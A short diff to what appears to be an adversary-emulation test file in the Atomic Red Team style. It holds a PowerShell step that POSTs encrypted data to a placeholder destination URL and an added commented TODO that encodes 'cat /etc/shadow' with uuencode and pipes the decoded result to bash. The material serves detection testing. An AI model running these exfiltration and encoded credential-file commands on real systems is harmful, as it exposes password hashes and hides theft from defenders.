@@ -54,3 +54,18 @@ atomic_tests:
       [System.Net.ServicePointManager]::Expect100Continue = $false
       Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $cyphertext -DisableKeepAlive
     name: powershell
+
+
+
+# TODO 
+# msg "uuencode/decode" && {
+#     echo "cat /etc/shadow" | uuencode - > test2
+#     uudecode test2 | bash
+#     echo "cat /etc/shadow" | uuencode -m - > test3
+#     uudecode test3 | bash
+# }
+
+# msg "xxd" && {
+#     xxd $(which true) > true-hex
+#     xxd -r true-hex > true-bin
+# }
